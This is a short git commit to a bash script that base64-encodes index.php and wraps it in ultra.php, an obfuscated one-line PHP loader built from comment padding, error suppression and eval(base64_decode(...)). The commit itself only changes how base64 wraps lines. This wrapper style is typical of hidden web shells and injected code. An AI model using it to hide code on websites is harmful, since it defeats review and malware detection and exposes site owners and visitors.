b20d6745a7c7308ad2c5472038cb0cde24c93b83
Thomas Norberg <tnorberg@thomasnorberg.com>
2022-10-24 21:40:03 -0400

    adding -w for new lines.

--- create_php_file.sh
+++ create_php_file.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-base64string=$(base64 < index.php)
+base64string=$(base64 --w 0 < index.php)
 echo "<?php /****/@null; /********/ /********/ /********/@eval/****/(\"?>\".base64_decode(\"${base64string}\")); ?>" > ultra.php
